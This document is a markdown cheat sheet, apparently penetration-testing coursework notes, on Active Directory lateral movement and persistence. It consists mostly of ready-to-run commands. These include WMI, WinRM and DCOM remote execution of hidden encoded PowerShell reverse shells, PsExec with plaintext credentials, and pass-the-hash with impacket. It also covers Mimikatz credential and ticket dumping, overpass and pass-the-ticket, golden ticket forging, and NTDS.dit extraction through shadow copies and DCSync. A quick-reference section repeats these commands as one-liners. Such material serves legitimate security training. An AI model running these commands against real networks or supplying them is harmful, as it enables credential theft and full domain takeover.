# Lateral Movement in Active Directory - Cheat Sheet & Walkthrough

## Table of Contents
1. [Active Directory Lateral Movement Techniques](#1-active-directory-lateral-movement-techniques)
2. [Active Directory Persistence](#2-active-directory-persistence)
3. [Quick Reference](#3-quick-reference)

---

## 1. Active Directory Lateral Movement Techniques

### 1.1 WMI and WinRM

#### WMI (Windows Management Instrumentation)
- Uses RPC over port 135
- Communication via `Win32_Process` class
- Requires local admin privileges on target
- Domain users bypass UAC remote restrictions

#### WMI with wmic (Legacy)
```cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

#### WMI with PowerShell
```powershell
# Create credential object
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

# Create CIM session
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options

# Execute command
$Command = 'calc'
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```

#### WMI Reverse Shell
```powershell
# Generate base64 encoded PowerShell reverse shell
# Then execute
$Command = 'powershell -nop -w hidden -e BASE64_PAYLOAD'
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```

#### WinRM (Windows Remote Management)
- Uses ports 5985 (HTTP) and 5986 (HTTPS)
- Part of `WS-Management` protocol
- Domain user must be in Administrators or Remote Management Users group

#### winrs (Windows Remote Shell)
```cmd
# Execute single command
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"

# Reverse shell
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e BASE64_PAYLOAD"
```

#### PowerShell Remoting (WinRM)
```powershell
# Create credential object
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

# Create PSSession
New-PSSession -ComputerName 192.168.50.73 -Credential $credential

# Enter session
Enter-PSSession 1
```

---

### 1.2 PsExec

#### Requirements
1. User in Administrators local group
2. ADMIN$ share available
3. File and Printer Sharing enabled

#### How It Works
1. Writes `psexesvc.exe` to `C:\Windows`
2. Creates and spawns service on remote host
3. Runs requested program as child process

#### PsExec Usage
```cmd
# Interactive shell
PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd

# Run command
PsExec64.exe \\FILES04 -u corp\jen -p Nexus123! whoami
```

---

### 1.3 Pass the Hash (PtH)

#### Requirements
- SMB port 445 open
- File and Printer Sharing enabled
- ADMIN$ share available
- Local administrative rights

#### Tools Supporting PtH
| Tool | Purpose |
|------|---------|
| impacket-wmiexec | Command execution |
| impacket-psexec | Command execution |
| impacket-smbclient | SMB access |
| Metasploit psexec | Command execution |
| pth-toolkit | Various |

#### PtH with impacket-wmiexec
```bash
impacket-wmiexec -hashes :NTLM_HASH Administrator@192.168.50.73
```

#### PtH Limitations
- **2014 Security Update**: Only works for built-in Administrator or domain accounts
- No other local admin accounts

---

### 1.4 Overpass the Hash

#### Concept
Convert NTLM hash to Kerberos TGT for Kerberos authentication.

#### Overpass the Hash with Mimikatz
```cmd
# Get NTLM hash first (sekurlsa::logonpasswords)
# Then create process with NTLM hash
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

#### Generate TGT
```powershell
# In new PowerShell session
net use \\files04
```

#### Verify Tickets
```cmd
klist
```

#### Use with PsExec
```cmd
# Now use Kerberos authentication
PsExec.exe \\files04 cmd
```

#### Overpass the Hash Flow
```
NTLM Hash → sekurlsa::pth → PowerShell Process → net use → TGT → PsExec
```

---

### 1.5 Pass the Ticket

#### Concept
Export and re-inject Kerberos tickets (TGS) into another session.

#### Export Tickets with Mimikatz
```cmd
privilege::debug
sekurlsa::tickets /export
```

#### Ticket Files
```
[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
[0;12bd0]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
```

#### Inject Ticket
```cmd
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

#### Verify and Use
```cmd
klist
ls \\web04\backup
```

#### TGT vs TGS

| Ticket Type | Purpose | Reusable |
|-------------|---------|----------|
| **TGT** | Get service tickets | Yes (within lifetime) |
| **TGS** | Access specific service | No (service-specific) |

---

### 1.6 DCOM (Distributed Component Object Model)

#### Requirements
- RPC over TCP port 135
- Local administrator access

#### DCOM with MMC20.Application
```powershell
# Instantiate remote MMC
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

# Execute command
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

#### DCOM Reverse Shell
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e BASE64_PAYLOAD","7")
```

#### DCOM Discovery
- MMC20.Application.1 is one of many
- Other COM objects may also expose remote command execution

---

### 1.7 Lateral Movement Technique Comparison

| Technique | Protocol | Ports | Requires Admin | Stealth |
|-----------|----------|-------|----------------|---------|
| **WMI** | RPC/DCOM | 135+ | Yes | Medium |
| **WinRM** | HTTP/HTTPS | 5985/5986 | Yes | Medium |
| **PsExec** | SMB | 445 | Yes | Low |
| **Pass the Hash** | SMB | 445 | Yes | Medium |
| **Overpass the Hash** | Kerberos | 88 | Yes | High |
| **Pass the Ticket** | Kerberos | 88 | No (if existing ticket) | High |
| **DCOM** | RPC | 135 | Yes | Medium |

---

## 2. Active Directory Persistence

### 2.1 Golden Ticket

#### Concept
Forge Kerberos TGT using the `krbtgt` account's NTLM hash.

#### Why It Works
- krbtgt hash encrypts all TGTs
- Domain trusts TGTs encrypted with krbtgt hash
- Can forge tickets with arbitrary group memberships

#### Get krbtgt Hash
```cmd
# On Domain Controller as Domain Admin
privilege::debug
lsadump::lsa /patch
```

#### Create Golden Ticket
```cmd
kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

#### Golden Ticket Parameters
| Parameter | Description |
|-----------|-------------|
| `/user` | Any domain user (existing) |
| `/domain` | Domain name |
| `/sid` | Domain SID (without RID) |
| `/krbtgt` | NTLM hash of krbtgt account |
| `/ptt` | Pass-the-ticket (inject) |

#### Default Group Memberships
- Domain Admins (512)
- Enterprise Admins (519)
- Schema Admins (518)
- Group Policy Creator Owners (520)

#### Use Golden Ticket
```cmd
PsExec.exe \\dc1 cmd.exe
```

#### Golden Ticket vs Silver Ticket

| Feature | Golden Ticket | Silver Ticket |
|---------|---------------|---------------|
| **Target** | Entire domain | Specific service |
| **Key** | krbtgt hash | SPN hash |
| **Access** | All domain resources | One service |
| **Persistence** | Yes | Limited |

---

### 2.2 Shadow Copies

#### Concept
Create volume shadow copy to extract NTDS.dit (AD database).

#### Create Shadow Copy
```cmd
vshadow.exe -nw -p C:
```

#### Note Shadow Copy Device
```
Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

#### Extract NTDS.dit
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

#### Save SYSTEM Hive
```cmd
reg.exe save hklm\system c:\system.bak
```

#### Extract Hashes Locally
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

#### Alternative: DCSync
```cmd
# Less stealthy but doesn't require file transfer
lsadump::dcsync /all
```

---

## 3. Quick Reference

### Commands Quick Reference

#### WMI
```powershell
# PowerShell WMI reverse shell
$username='jen';$password='Nexus123!';$secureString=ConvertTo-SecureString $password -AsPlaintext -Force;$credential=New-Object System.Management.Automation.PSCredential $username,$secureString;$Options=New-CimSessionOption -Protocol DCOM;$Session=New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options;$Command='powershell -nop -w hidden -e BASE64';Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$Command}
```

#### WinRM
```cmd
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e BASE64"
```

#### PsExec
```cmd
PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

#### Pass the Hash
```bash
impacket-wmiexec -hashes :NTLM_HASH Administrator@192.168.50.73
```

#### Overpass the Hash
```cmd
sekurlsa::pth /user:jen /domain:corp.com /ntlm:NTLM_HASH /run:powershell
```

#### Pass the Ticket
```cmd
sekurlsa::tickets /export
kerberos::ptt ticket.kirbi
```

#### DCOM
```powershell
$dcom=[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"));$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"-e BASE64","7")
```

#### Golden Ticket
```cmd
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:KRBTGT_HASH /ptt
```

#### Shadow Copy
```cmd
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
```

### Key Takeaways

| Concept | Key Point |
|---------|-----------|
| **WMI** | Uses RPC port 135, requires admin |
| **WinRM** | Uses port 5985/5986, requires admin |
| **PsExec** | Uses SMB port 445, requires admin |
| **Pass the Hash** | Use NTLM hash instead of password |
| **Overpass the Hash** | Convert NTLM hash to Kerberos TGT |
| **Pass the Ticket** | Reuse exported Kerberos tickets |
| **DCOM** | Remote COM object execution |
| **Golden Ticket** | Forge TGT with krbtgt hash |
| **Shadow Copy** | Extract NTDS.dit for offline cracking |